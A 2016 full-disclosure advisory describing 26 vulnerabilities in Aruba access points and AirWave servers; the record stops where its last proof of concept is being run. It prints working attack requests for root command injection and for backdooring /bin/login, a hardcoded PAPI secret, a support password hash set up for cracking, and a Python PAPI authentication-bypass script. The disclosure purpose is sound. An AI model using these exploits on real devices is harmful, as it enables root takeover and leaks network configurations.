@@ -1,0 +1,988 @@
+
+Date: Fri, 6 May 2016 09:09:57 +0200
+From: Sven Blumenstein <svbl@...gle.com>
+To: fulldisclosure@...lists.org
+Subject: [FD] Aruba ArubaOS/Aruba Instant/AirWave Management - Multiple
+ Vulnerabilities (CVE-2016-2031, CVE-2016-2032)
+
+Aruba ArubaOS/Aruba Instant/AirWave Management - Multiple Vulnerabilities
+-------------------------------------------------------------------------
+
+Introduction
+============
+Multiple vulnerabilities were identified in Aruba AP, IAP and AMP devices. The
+Vulnerabilities were discovered during a black box security assessment and
+therefore the vulnerability list should not be considered exhaustive. Several
+of the high severity vulnerabilities listed in this report are related to the
+Aruba proprietary PAPI protocol and allow remote compromise of affected devices.
+
+
+Affected Software And Versions
+==============================
+  - ArubaOS (all versions)
+  - AirWave Management Platform 8.x prior to 8.2
+  - Aruba Instant (all versions up to, but not including, 4.1.3.0 and 4.2.3.1)
+
+
+CVE
+===
+The following CVE were assigned to the issues described in this report:
+
+  - CVE-2016-2031
+  - CVE-2016-2032
+
+
+Vulnerability Overview
+======================
+ 1. AMP: RabbitMQ Management interface exposed
+ 2. AMP: XSRF token uses weak calculation algorithm
+ 3. AMP: Arbitrary modification of /etc/ntp.conf
+ 4. AMP: PAPI uses static key for calculating validation checksum (auth bypass)
+ 5. (I)AP: Insecure transmission of login credentials (GET)
+ 6. (I)AP: Built in privileged "support" account
+ 7. (I)AP: Static password hash for support account
+ 8. (I)AP: Unusual account identified ("arubasecretadmin")
+ 9. (I)AP: Privileged remote code execution
+10. (I)AP: Radius passwords allow arbitrary raddb commands
+11. (I)AP: Unauthenticated disclosure of environment variables
+12. (I)AP: Information disclosure by firmware checking functionality
+13. (I)AP: Unauthenticated automated firmware update requests
+14. (I)AP: Firmware updater does not check certificates
+15. (I)AP: Forceful downgrade of FW versions possible
+16. (I)AP: Firmware update check discloses machine certificate
+17. (I)AP: Firmware is downloaded via unencrypted connection
+18. (I)AP: Firmware update Challenge/Response does not protect the Client
+19. (I)AP: Unencrypted private keys and certs
+20. (I)AP: Potential signature private key
+21. (I)AP: PAPI Endpoints exposed to all interfaces
+22. (I)AP: PAPI Endpoint does not validate MD5 signatures
+23. (I)AP: PAPI protocol encrypted with weak encryption algorithm
+24. (I)AP: PAPI protocol authentication bypass
+25. (I)AP: Broadcast with detailed system information (LLDP)
+26. (I)AP: User passwords are encrypted with a static key
+
+
+Vulnerability Details
+=====================
+
+---------------------------------------------
+1. AMP: RabbitMQ Management interface exposed
+---------------------------------------------
+
+AMPs expose the management frontend for the RabbitMQ message queue on all
+interfaces via tcp/15672 and tcp/55672.
+
+  # netstat -nltp | grep beam
+  tcp        0      0 127.0.0.1:5672              0.0.0.0:*
+       LISTEN      2830/beam.smp
+  tcp        0      0 127.0.0.1:17716             0.0.0.0:*
+       LISTEN      2830/beam.smp
+  tcp        0      0 0.0.0.0:15672               0.0.0.0:*
+       LISTEN      2830/beam.smp
+  tcp        0      0 0.0.0.0:55672               0.0.0.0:*
+       LISTEN      2830/beam.smp
+
+The password for the default user "airwave" is stored in the world readable
+file /etc/rabbitmq/rabbitmq.config in plaintext:
+
+  # ls -l /etc/rabbitmq/rabbitmq.config
+  -rw-r--r-- 1 root root 275 Oct 28 15:48 /etc/rabbitmq/rabbitmq.config
+  # grep default_ /etc/rabbitmq/rabbitmq.config
+          {default_user,<<"airwave">>},
+          {default_pass,<<"***REMOVED***">>}
+
+--------------------------------------------------
+2. AMP: XSRF token uses weak calculation algorithm
+--------------------------------------------------
+
+The XSRF token is calculated based on limited sources of entropy, consisting of
+the user's time of login and a random number between 0 and 99999. The algorithm
+Is approximated by the following example Python script:
+
+  base64.b64encode(hashlib.md5('%d%5.5d' % (int(time.time()),
+random.randint(0,99999))).digest())
+
+
+-----------------------------------------------
+3. AMP: Arbitrary modification of /etc/ntp.conf
+-----------------------------------------------
+
+Incorrect/missing filtering of input parameters allows injecting new lines and
+arbitrary commands into /etc/ntp.conf, when updating the NTP settings via the
+web frontend.
+
+  POST /nf/pref_network? HTTP/1.1
+  Host: 192.168.131.162
+  [...]
+
+  id=&ip_1=192.168.131.162&hostname_1=foo.example.com&
+  subnet_mask_1=255.255.255.248&gateway_1=192.168.131.161&dns1_1=172.16.255.1&
+  dns2_1=&eth1_enabled_1=0&eth1_ip_1=&eth1_netmask_1=&
+  ntp1_1=time1.example.com%0afoo&ntp2_1=time2.example.com&save=Save
+
+The above POST requests results in the following ntp.conf being generated:
+
+  # cat /etc/ntp.conf
+  [...]
+  server time1.example.com
+  foo
+  server time2.example.com
+
+------------------------------------------------------------------------------
+4. AMP: PAPI uses static key for calculating validation checksum (auth bypass)
+------------------------------------------------------------------------------
+
+PAPI packets sent from an AP to an AMP are authenticated with a cryptographic
+checksum. The packet format is only partially known, as it's a proprietary
+format created by Aruba. A typical PAPI packet sent to an AMP is as follows:
+
+
+  0000   49 72 00 02 64 69 86 2d 7f 00 00 01 01 00 01 00  Ir..di.-........
+  0010   20 1f 20 1e 00 01 00 00 00 01 3e f9 22 49 05 b3   . .......>."I..
+  0020   50 89 40 d3 5d 9d d6 af 46 98 c1 a6              P.@.]...F...
+
+
+The following dissection of the above shown packet gives a more detailed
+overview of the format:
+
+  49 72                                                 ID
+  00 02                                                 Version
+  64 69 86 2d                                           PAPI Destination IP
+  7f 00 00 01                                           PAPI Source IP
+  01 00                                                 Unknown1
+  01 00                                                 Unknown2
+  20 1f                                                 PAPI Source Port
+  20 1e                                                 PAPI Destination Port
+  00 01                                                 Unknown3
+  00 00                                                 Unknown4
+  00 01                                                 Sequence Number
+  3e f9                                                 Unknown5
+  22 49 05 b3 50 89 40 d3 5d 9d d6 af 46 98 c1 a6       Checksum
+
+
+The checksum is based on a MD5 hash of a padded concatenation of all fields and
+a secret token. The secret token is hardcoded in multiple binaries on the AMP
+and can easily be retrieved via core Linux system tools:
+
+  $ strings /opt/airwave/bin/msgHandler | grep asd
+  asdf;lkj763
+
+Using this secret token it is possible to craft valid PAPI packets and issue
+commands to the AMP, bypassing the authentication based on the shared
+secret / token. This can be exploited to compromise of the device.
+Random sampling of different software versions available on
+Aruba's website confirmed that the shared secret is identical for all versions.
+
+-------------------------------------------------------
+5. AP: Insecure transmission of login credentials (GET)
+-------------------------------------------------------
+
+Username and password to authenticate with the AP web frontend are transmitted
+through HTTP GET. This method should not be used in a form that transmits
+sensitive data, because the data is displayed in clear text in the URL.
+
+  GET /swarm.cgi?opcode=login&user=admin&passwd=admin HTTP/1.1
+
+The login URL can potentially appear in Proxy logs, the server logs or
+browser history. This possibly discloses the authentication data to
+unauthorized persons.
+
+--------------------------------------------
+6. AP: Built in privileged "support" account
+--------------------------------------------
+
+The APs provide a built in system account called "support". When connected to
+the restricted shell of the AP via SSH, issuing the command "support", triggers
+a password request:
+
+
+  00:0b:86:XX:XX:XX# support
+  Password:
+
+A quick internet search clarified, that this password is meant for use by Aruba
+engineers only:
+http://community.arubanetworks.com/t5/Unified-Wired-Wireless-Access/OS5-0-support-password/td-p/26760
+
+Further research on that functionality lead to the conclusion that this
+functionality provides root-privileged shell access to the underlying operating
+system of the AP, given the correct password is entered.
+
+-----------------------------------------------
+7. AP: Static password hash for support account
+-----------------------------------------------
+
+The password hash for the "support" account mentioned in vulnerability #6 is
+stored in plaintext on the AP.
+
+  $ strings /aruba/bin/cli | grep ^bc5
+  bc54907601c92efc0875233e121fd3f1cebb8b95e2e3c44c14
+
+Random sampling of different versions of Firmware images available on Aruba's
+website confirmed that the password hash is identical for all versions. The
+password check validating a given "support" password is based on the following
+algorithm:
+
+  SALT + sha1(SALT + PASSWORD)
+
+Where SALT equals the first 5 bytes of the password hash in binary
+representation. It is possible to run a brute-force attack on this hash format
+using JtR with the following input format:
+
+  support:$dynamic_25$c92efc0875233e121fd3f1cebb8b95e2e3c44c14$HEX$bc54907601
+
+------------------------------------------------------
+8. AP: Unusual account identified ("arubasecretadmin")
+------------------------------------------------------
+
+The AP's system user configuration contains a undocumented account called
+"arubasecretadmin". This account was the root cause for CVE-2007-0932 and
+allowed administrative login with a static password.
+
+  /etc/passwd:
+  nobody:x:99:99:Nobody:/:/sbin/nologin
+  root:x:0:0:Root:/:/bin/sh
+  admin:x:100:100:Admin:/:/bin/telnet3
+  arubasecretadmin:x:101:100:Aruba Admin:/:/bin/telnet2
+  serial:x:102:100:Serial:/:/bin/telnet4
+
+Further tests indicated that login with this account seems not possible as it
+is not mapped through Arubas authentication mechanisms. The reason for it being
+still configured on the system is unknown.
+
+---------------------------------------
+9. AP: Privileged remote code execution
+---------------------------------------
+
+Insufficient checking of parameters allows an attacker to execute commands
+with root privileges on the AP. The vulnerable parameter is "image_url" which
+is used in the Firmware update function.
+
+  GET /swarm.cgi?opcode=image-url-upgrade&ip=127.0.0.1&oper_id=6&image_url=Aries@http://10.0.0.1/?"`/usr/sbin/mini_httpd+-d+/+-u+root+-p+1234+-C+/etc/mini_httpd.conf`"&auto_reboot=false&refresh=true&sid=OWsiU5MM7DxVf9FRWe3P&nocache=0.9368100591919084
+HTTP/1.1
+
+The above example starts a new instance of mini_httpd on tcp/1234, which allows
+browsing the AP's filesystem. The following list of commands, if executed in
+order, start a telnet service that allows passwordless root login.
+
+  killall -9 utelnetd
+  touch /tmp/telnet_enable
+  echo \#\!/bin/sh > /bin/login
+  echo /bin/sh >> /bin/login
+  chmod +x /bin/login
+  /sbin/utelnetd
+
+Connecting to the telnet service started by the above command chain:
+
+  # telnet 10.0.XX.XX
+  Trying 10.0.XX.XX...
+  Connected to 10.0.XX.XX.
+  Escape character is '^]'.
+  Switching to Full Access
+  /aruba/bin # echo $USER
+  root
+  /aruba/bin #
+
+Potential exploits of this vulnerability can be detected through the
+AP's log file:
+  [...]
+  Jan  1 02:43:47  cli[2052]: <341004> <WARN> |AP
+00:0b:86:XX:XX:XX2@...0.XX.XX cli|
+http://10.0.XX.XX/?"`/sbin/utelnetd`"
+  [...]
+
+-------------------------------------------------------
+10. AP: Radius passwords allow arbitrary raddb commands
+-------------------------------------------------------
+
+Insufficient checking of the GET parameter "cmd" allows the injection of
+arbitrary commands and configuration parameters in the raddb configuration.
+
+Example:
+  GET /swarm.cgi?opcode=config&ip=127.0.0.1&cmd=%27user%20foo%20foo%22,my-setting%3d%3d%22blah%20portal%0Ainbound-firewall%0Ano%20rule%0Aexit%0A%27&refresh=false&sid=Lppj9jT2xQmYKqjEx5eP&nocache=0.10862623626107548
+HTTP/1.1
+
+  /aruba/radius/raddb/users:
+  foo Filter-Id == MAC-GUEST, Cleartext-Password := "foo",my-setting=="blah"
+
+
+As shown in the above example, inserting a double-quote in the password allows
+to add additional commands after the password.
+
+-----------------------------------------------------------
+11. AP: Unauthenticated disclosure of environment variables
+-----------------------------------------------------------
+
+It is possible to request a listing of environment variables by requesting a
+specific URL on the AP's web server. The request does not require
+authentication.
+
+  GET /swarm.cgi?opcode=printenv HTTP/1.1
+
+  HTTP/1.0 200 OK
+  Content-Type:text/plain; charset=utf-8
+  Pragma: no-cache
+  Cache-Control: max-age=0, no-store
+
+  Environment variables
+
+  CHILD_INDEX=0
+  PATH=/usr/local/bin:/usr/ucb:/bin:/usr/bin
+  LD_LIBRARY_PATH=/usr/local/lib:/usr/lib
+  SERVER_SOFTWARE=
+  SERVER_NAME=10.0.XX.XX
+  GATEWAY_INTERFACE=CGI/1.1
+  SERVER_PROTOCOL=HTTP/1.0
+  SERVER_PORT=4343
+  REQUEST_METHOD=GET
+  SCRIPT_NAME=/swarm.cgi
+  QUERY_STRING=opcode=printenv
+  REMOTE_ADDR=10.0.XX.XX
+  REMOTE_PORT=58804
+  HTTP_REFERER=https://10.0.XX.XX:4343/
+  HTTP_USER_AGENT=Mozilla/5.0 (X11; Linux x86_64; rv:38.0)
+Gecko/20100101 Firefox/38.0 Iceweasel/38.3.0
+  HTTP_HOST=10.0.XX.XX:4343
+
+-----------------------------------------------------------------
+12. AP: Information disclosure by firmware checking functionality
+-----------------------------------------------------------------
+
+When the AP checks device.arubanetworks.com for a new firmware version, it
+sends detailed information of the AP in plaintext to the remote host.
+
+  POST /firmware HTTP/1.1
+  Host: device.arubanetworks.com
+  Content-Length: 2
+  Connection: keep-alive
+  X-Type: firmware-check
+  X-Guid: 2dbe42XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+  X-OEM-Tag: Aruba
+  X-Mode: IAP
+  X-Factory-Default: Yes
+  X-Current-Version: 6.4.2.6-4.1.1.10_51810
+  X-Organization: ***REMOVED (Company Internal Name)***
+  X-Ap-Info: CC00XXXXX, 00:0b:86:XX:XX:XX, RAP-155
+  X-Features: 0000100001001000000000000000000000000000000000010000000
+
+----------------------------------------------------------
+13. AP: Unauthenticated automated firmware update requests
+----------------------------------------------------------
+
+The web frontend of the AP provides functionality to initiate an automated
+firmware update. Doing so triggers the AP to initiate communication with
+device.arubanetworks.com and automatically download and install a new firmware
+image. The CGI opcode for that automatic update is "image-server-check" and it
+was discovered that the "sid" parameter is not checked for this opcode. Therefor
+an attacker can issue the automatic firmware update without authentication by
+sending the following GET request to the AP.
+
+  GET /swarm.cgi?opcode=image-server-check&ip=127.0.0.1&sid=x
+
+As shown above, the "sid" parameter has to be submitted as part of the URL, but
+can be set to anything. Although all opcode actions follow the same calling
+scheme, "image-server-check" was the only opcode where the session ID was not
+validated.
+
+Combined with other vulnerabilities (#14, #15), this could be exploited to
+install an outdated, vulnerable firmware on the AP.
+
+----------------------------------------------------
+14. AP: Firmware updater does not check certificates
+----------------------------------------------------
+
+The communication between AP and device.arubanetworks.com is secured by using
+SSL. The AP does not do proper certificate validation for the communication to
+device.arubanetworks.com. A typical SSL MiTM attack using DNS spoofing and a
+self-signed certificate allowed interception of the traffic between AP and
+device.arubanetworks.com.
+
+--------------------------------------------------
+15. AP: Forceful downgrade of FW versions possible
+--------------------------------------------------
+
+When checking device.arubanetworks.com for a new firmware image, the AP sends
+it's current version to the remote host. If there is no new firmware available,
+device.arubanetworks.com does not provide any download options. If the initial
+version sent from the AP is modified by an attacker (via MiTM), the remote
+server will reply with the current firmware version. The AP will then reject
+that firmware, as it's current version is more recent/the same. Downgrading the
+version does also not work based on the validation the AP does.
+This behaviour can be overwritten if an attacker intercepts and modifies the
+reply from device.arubanetworks.com and adds X-header called
+"X-Mandatory-Upgrade".
+
+Example of a spoofed reply from device.arubanetworks.com:
+
+  HTTP/1.0 200 OK
+  Date: Wed, 11 Nov 2015 12:12:20 GMT
+  Content-Length: 91
+  Content-Type: text/plain; charset=UTF-8
+  X-Activation-Key: FXXXXXXX
+  X-Session-Id: 05d607dd-958b-42c4-a355-bd54e1a32e8e
+  X-Status-Code: success
+  X-Type: firmware-check
+  X-Mandatory-Upgrade: true
+  Connection: close
+
+
+  6.4.2.6-4.1.1.10_51810
+  23 http://10.0.0.1:4321/ArubaInstant_Aries_6.4.2.6-4.1.1.10_51810
+
+
+As shown above, the Header "X-Mandatory-Upgrade" was added to the server's
+reply. This causes the AP to skip its validation checks and accept any firmware
+version provided, regardless if it is the same or older than the current one.
+
+-----------------------------------------------------------
+16. AP: Firmware update check discloses machine certificate
+-----------------------------------------------------------
+
+While observing the traffic between an AP and device.arubanetworks.com, it was
+discovered that the AP discloses it's machine certificate to the remote
+endpoint.
+
+  POST /firmware HTTP/1.1
+  Host: 10.0.XX.XX
+  Content-Length: 2504
+  Connection: close
+  X-Type: firmware-check
+  X-Guid: 2dbe42XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+  X-OEM-Tag: Aruba
+  X-Mode: IAP
+  X-Factory-Default: Yes
+  X-Session-Id: e0b24fb1-e2f7-4e06-9473-1266b50a3fec
+  X-Current-Version: 6.4.2.6-4.1.1.10_51810
+  X-Organization: ***REMOVED (Company Internal Name)***
+  X-Ap-Info: CC00XXXXX, 00:0b:86:XX:XX:XX, RAP-155
+  X-Features: 0000100001001000000000000000000000000000000000010000000
+  X-Challenge-Hash: SHA-1
+
+
+  -----BEGIN CERTIFICATE-----
+  MIIGTjCCBTagAwI...
+  [...]
+  -----END CERTIFICATE-----
+
+
+The certificate sent in the above request is the same (in PEM format) as found
+under the following path on the AP:
+
+  /tmp/deviceCerts/certifiedKeyCert.der
+
+Comparison of the certificate from the HTTP Request and from the AP filesystem:
+
+  $ sha256sum dumped-fw-cert.txt certifiedKeyCert.der.pem
+  68ebb521dff53d8dcb8e4a0467dcae38cf45a0d812897393632bdd9ef6f354e8
+dumped-fw-cert.txt
+  68ebb521dff53d8dcb8e4a0467dcae38cf45a0d812897393632bdd9ef6f354e8
+certifiedKeyCert.der.pem
+
+---------------------------------------------------------
+17. AP: Firmware is downloaded via unencrypted connection
+---------------------------------------------------------
+
+Firmware images are downloaded via unencrypted HTTP to the AP. An example reply
+containing the download paths looks as follows:
+
+  HTTP/1.1 200 OK
+  Date: Wed, 11 Nov 2015 13:18:58 GMT
+  Content-Length: 552
+  Content-Type: text/plain; charset=UTF-8
+  X-Activation-Key: FXXXXXXX
+  X-Session-Id: 05d607dd-958b-42c4-a355-bd54e1a32e8e
+  X-Status-Code: success
+  X-Type: firmware-check
+  Connection: close
+
+
+  6.4.2.6-4.1.1.10_51810
+  25 http://images.arubanetworks.com/fwfiles/ArubaInstant_Centaurus_6.4.2.6-4.1.1.10_51810
+  30 http://images.arubanetworks.com/fwfiles/ArubaInstant_Taurus_6.4.2.6-4.1.1.10_51810
+  15 http://images.arubanetworks.com/fwfiles/ArubaInstant_Cassiopeia_6.4.2.6-4.1.1.10_51810
+  10 http://images.arubanetworks.com/fwfiles/ArubaInstant_Orion_6.4.2.6-4.1.1.10_51810
+  23 http://images.arubanetworks.com/fwfiles/ArubaInstant_Aries_6.4.2.6-4.1.1.10_51810
+  26 http://images.arubanetworks.com/fwfiles/ArubaInstant_Pegasus_6.4.2.6-4.1.1.10_51810
+
+An attacker could potentially MiTM connections to images.arubanetworks.com and
+possibly replace the firmware images downloaded by the AP.
+
+----------------------------------------------------------------------
+18. AP: Firmware update Challenge/Response does not protect the Client
+----------------------------------------------------------------------
+
+The update check process between AP and device.arubanetworks.com works
+as follows:
+
+  AP => device.arubanetworks.com
+  POST /firmware
+  X-Type: firmware-check
+
+  AP <= device.arubanetworks.com
+        200 OK
+        X-Session-Id: bd4...
+        X-Challenge: 123123...
+
+  AP => device.arubanetworks.com
+  POST /firmware
+  X-Session-Id: bd4...
+
+  [machine certificate]
+  [signature]
+
+  AP <= device.arubanetworks.com
+        200 OK
+        X-Session-Id: bd4...
+
+        [firmware image urls]
+
+When inspecting the communication process carefully, it is clear that the final
+response from device.arubanetworks.com does not contain any (cryptographic)
+signature. An attacker could impersonate device.arubanetworks.com, send an
+arbitrary challenge, ignore the response and just reply with a list of firmware
+images. The only thing that has to be kept the same over requests is the
+X-Session-Id header, which is also sent initially by the remote host and not
+the AP and therefore under full control of the attacker.
+
+------------------------------------------
+19. AP: Unencrypted private keys and certs
+------------------------------------------
+
+The AP firmware image contains the unencrypted private key and certificate for
+securelogin.arubanetworks.com issued by GeoTrust and valid until 2017. The key
+and cert was found under the path /aruba/conf/cpprivkey.pem.
+
+  $ openssl x509 -in cpprivkey.pem -text -noout
+  Certificate:
+      Data:
+          Version: 3 (0x2)
+          Serial Number: 121426 (0x1da52)
+      Signature Algorithm: sha1WithRSAEncryption
+          Issuer: C=US, O=GeoTrust Inc., OU=Domain Validated SSL,
+CN=GeoTrust DV SSL CA
+          Validity
+              Not Before: May 11 01:22:10 2011 GMT
+              Not After : Aug 11 04:40:59 2017 GMT
+          Subject: serialNumber=lLUge2fRPkWcJe7boLSVdsKOFK8wv3MF,
+C=US, O=securelogin.arubanetworks.com, OU=GT28470348, OU=See
+www.geotrust.com/resources/cps (c)11, OU=Domain Control Validated -
+QuickSSL(R) Premium, CN=securelogin.arubanetworks.com
+  [...]
+
+  $ openssl rsa -in cpprivkey.pem -check
+  RSA key ok
+  writing RSA key
+  -----BEGIN RSA PRIVATE KEY-----
+  MIIEpQIBAAKCAQEA….
+  [...]
+  -----END RSA PRIVATE KEY-----
+
+---------------------------------------
+20. AP: Potential signature private key
+---------------------------------------
+
+A potential SSL key was found under the path /etc/sig.key. Based on the header
+(3082xxxx[02,03]82), the file looks like a SSL key in DER format:
+
+$ xxd etc/sig.key
+00000000: 3082 020a 0282 0201 00d9 2d71 db0f decb  0.........-q....
+
+It was not possible to decode the key. Therefore it's not 100% clear if is an
+actual key or just a garbaged file.
+
+------------------------------------------------
+21. AP: PAPI Endpoints exposed to all interfaces
+------------------------------------------------
+
+The PAPI endpoint "msgHandler" creates listeners on all interfaces. Therefore
+it is reachable via wired and wireless connections to the AP. This increases
+the potential attack surface.
+
+  # netstat -nlu | grep :82
+  udp        0      0 :::8209                 :::*
+  udp        0      0 :::8211                 :::*
+
+Additionally the local ACL table of the AP contains a default firewall rule,
+permitting any traffic to udp/8209-8211, overwriting any manually set ACL to
+block access to PAPI:
+
+  00:0b:86:XX:XX:XX# show datapath acl 106
+  Datapath ACL 106 Entries
+  -----------------------
+  Flags: P - permit, L - log, E - established, M/e - MAC/etype filter
+        S - SNAT, D - DNAT, R - redirect, r - reverse redirect m - Mirror
+        I - Invert SA, i - Invert DA, H - high prio, O - set prio, C -
+Classify Media
+        A - Disable Scanning, B - black list, T - set TOS, 4 - IPv4, 6 - IPv6
+        K - App Throttle, d - Domain DA
+  ----------------------------------------------------------------
+   1:  any  any  17 0-65535 8209-8211  P4
+  [...]
+  12:  any  any  any  P4
+  00:0b:86:XX:XX:XX#
+
+------------------------------------------------------
+22. AP: PAPI Endpoint does not validate MD5 signatures
+------------------------------------------------------
+
+MD5 signature validation for incoming PAPI packets is disabled on the AP:
+
+  # ps | grep msgHandler
+   1988 root        508 S < /aruba/bin/msgHandler -n
+
+  # /aruba/bin/msgHandler -h
+  usage: msgHandler [-d] [-n]
+  -d = enable debug prints.
+  -n = disable md5 signatures.
+  -g = disable garbling.
+
+The watchdog service ("nanny") also restarts the PAPI handler with disabled MD5
+signature validation:
+
+  # grep msgH /aruba/bin/nanny_list
+  RESTART /aruba/bin/msgHandler -n
+
+--------------------------------------------------------------
+23. AP: PAPI protocol encrypted with weak encryption algorithm
+--------------------------------------------------------------
+
+PAPI packets sent to an AP contain an encrypted payload. The encryption seems
+to replace the MD5 signature check as described in #4 and used when PAPI is
+sent from AP to AMP. This might also explain why the PAPI endpoint runs with
+disabled MD5 signature verification on the AP (see #22).
+
+The following example shows an encrypted PAPI packet for the command
+"show version" as received by the AP:
+
+  0000  49 72 00 03 7f 00 00 01 0a 00 00 01 00 00 20 13   Ir............ .
+  0010  3b 60 3b 7e 20 04 00 00 00 03 00 00 00 00 00 00   ;`;~ ...........
+  0020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
+  0030  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
+  0040  00 00 00 00 00 00 00 00 00 00 00 00 97 93 93 93   ................
+  0050  a9 97 93 93 92 6e 96 99 93 93 92 95 94 91 93 97   .....n..........
+  0060  93 93 93 93 93 93 87 e9 eb e1 fc d0 dc c6 e4 fd   ................
+  0070  fa e1 f7 e9 d1 a6 f7 e7 c5 eb f1 93 93 9e e0 fb   ................
+  0080  fc e4 b3 e5 f6 e1 e0 fa fc fd 99                  ...........
+
+Important parts of the above packet:
+
+  7f 00 00 01         Destination IP (127.0.0.1)
+  0a 00 00 01         Source IP (10.0.0.1)
+  3b 60               Destination Port (15200)
+  3b 7e               Source Port (15230)
+  97 93 93 93-EOF     Encrypted PAPI payload
+
+Comparison of the above packet with a typical PAPI packet that is sent from the
+AP to the AMP quickly highlights the missing 0x00 that are used to pad certain
+fields of the PAPI payload. These 0x00 seem to be substituted with 0x93, which
+is a clear indication that the payload is "encrypted" with a 1 byte XOR. As
+XOR'ing 0x00 with 1 byte results in the same byte, the payload therefore
+discloses the key used and use of the weak XOR algorithm:
+
+    0x00: 00000000
+  ^ 0x93: 10010011
+  ================
+          10010011 (0x93)
+
+The following shows the above PAPI packet for "show version" with its payload
+decrypted:
+
+  0000  49 72 00 03 7f 00 00 01 0a 00 00 01 00 00 20 13   Ir............ .
+  0010  3b 60 3b 7e 20 04 00 00 00 03 00 00 00 00 00 00   ;`;~ ...........
+  0020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
+  0030  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
+  0040  00 00 00 00 00 00 00 00 00 00 00 00 04 00 00 00   ................
+  0050  3a 04 00 00 01 fd 05 0a 00 00 01 06 07 02 00 04   :...............
+  0060  00 00 00 00 00 00 14 7a 78 72 6f 43 4f 55 77 6e   .......zxroCOUwn
+  0070  69 72 64 7a 42 35 64 74 56 78 62 00 00 0d 73 68   irdzB5dtVxb...sh
+  0080  6f 77 20 76 65 72 73 69 6f 6e 0a                  ow version.
+
+(The string starting with "zxr..." is a HTTP session ID, see #25 on details how
+to bypass this).
+
+An example Python function for en-/decrypting PAPI payloads could look like
+this:
+
+  def aruba_encrypt(s):
+    return ''.join([chr(ord(c) ^ 0x93) for c in s])
+
+-------------------------------------------
+24. AP: PAPI protocol authentication bypass
+-------------------------------------------
+
+Besides it's typical use between different Aruba devices, PAPI is also used as
+an inter-process communication (IPC) mechanism between the CGI based web
+frontend and the backend processes on the AP. Certain commands that can be sent
+via PAPI are only supposed to be used via this IPC interface and not from an
+external source. Besides the weak "encryption" that is described in #23, some
+PAPI packets contain a HTTP session ID (SID), that matches the SID issued at
+login to the web frontend.
+
+Example IPC packet (payload decrypted as shown in #23):
+
+  0000  49 72 00 03 7f 00 00 01 0a 00 00 01 00 00 20 13   Ir............ .
+  0010  3b 60 3b 7e 20 04 00 00 00 03 00 00 00 00 00 00   ;`;~ ...........
+  0020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
+  0030  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
+  0040  00 00 00 00 00 00 00 00 00 00 00 00 04 00 00 00   ................
+  0050  40 04 00 00 01 fd 05 0a 00 00 01 06 07 02 00 04   @...............
+  0060  00 00 00 00 00 00 14 7a 78 72 6f 43 4f 55 77 6e   .......zxroCOUwn
+  0070  69 72 64 7a 42 35 64 74 56 78 62 00 00 13 73 68   irdzB5dtVxb...sh
+  0080  6f 77 20 63 6f 6e 66 69 67 75 72 61 74 69 6f 6e   ow configuration
+  0090  0a                                                .
+
+The SID in the example shown is "zxroCOUwnirdzB5dtVxb". The 0x14 before that
+indicates the length of the 20 byte SID. If the session is expired or an
+invalid session is specified, the packet is rejected by the PAPI endpoint
+(msgHandler).
+
+Replacing the 20 byte SID with 20 * 0x00, bypasses the SID check and therefore
+allows unauthenticated PAPI communication with the AP.
+
+Example IPC packet (Session ID replaced with 20 * 0x00, payload not XOR'ed for
+readability):
+
+  0000  49 72 00 03 7f 00 00 01 0a 00 00 01 00 00 20 13   Ir............ .
+  0010  3b 60 3b 7e 20 04 00 00 00 03 00 00 00 00 00 00   ;`;~ ...........
+  0020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
+  0030  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
+  0040  00 00 00 00 00 00 00 00 00 00 00 00 04 00 00 00   ................
+  0050  40 04 00 00 01 fd 05 0a 00 00 01 06 07 02 00 04   @...............
+  0060  00 00 00 00 00 00 14 00 00 00 00 00 00 00 00 00   ................
+  0070  00 00 00 00 00 00 00 00 00 00 00 00 00 13 73 68   ..............sh
+  0080  6f 77 20 63 6f 6e 66 69 67 75 72 61 74 69 6f 6e   ow configuration
+  0090  0a
+
+Using the above example, it is possible to request the system configuration
+from an AP, bypassing all authentication methods.
+
+If the above packet is sent using IPC from the webfrontend cgi to the backend,
+(localhost) the reply looks like follows:
+
+msg_ref 303 /tmp/.cli_msg_SW9iVE
+
+The cgi binary then reads this file and renders the content in the HTTP reply.
+If the PAPI packet comes from an external address (instead of localhost) the
+reply points to the APs web server (10.0.0.26 in this case) instead of /tmp/:
+
+msg_ref 2689 http://10.0.0.26/.cli_msg_n011xh
+
+Access to this file does not require authentication which raises the severity
+of this vulnerability significantly.
+
+The following Python script is a proof of concept for this vulnerability,
+sending a "show configuration" packet to an AP with the IP address 10.0.0.26:
+
+  import socket
+  def aruba_encrypt(s):
+    return ''.join([chr(ord(c) ^ 0x93) for c in s])
+  header = (
+    '\x49\x72\x00\x03\x7f\x00\x00\x01\x0a\x00\x00\x01\x00\x00\x20\x13'
+    '\x3b\x60\x3b\x7e\x20\x04\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00'
+    '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+    '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+    '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+  )
+  payload = (  # show configuration
+    '\x04\x00\x00\x00\x40\x04\x00\x00\x01\xfd\x05\x0a\x00\x00\x01\x06'
+    '\x07\x02\x00\x04\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x00\x00'
+    '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+    '\x00\x13\x73\x68\x6f\x77\x20\x63\x6f\x6e\x66\x69\x67\x75\x72\x61'
+    '\x74\x69\x6f\x6e\x0a'
+  )
+  sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+  sock.bind(('', 1337))
+  sock.sendto(header + aruba_encrypt(payload), ('10.0.0.26', 8211))
+  buff = sock.recvfrom(4096)
+  print aruba_encrypt(buff[0])
+
+Executing the above PoC:
+
+  # python arupapi.py
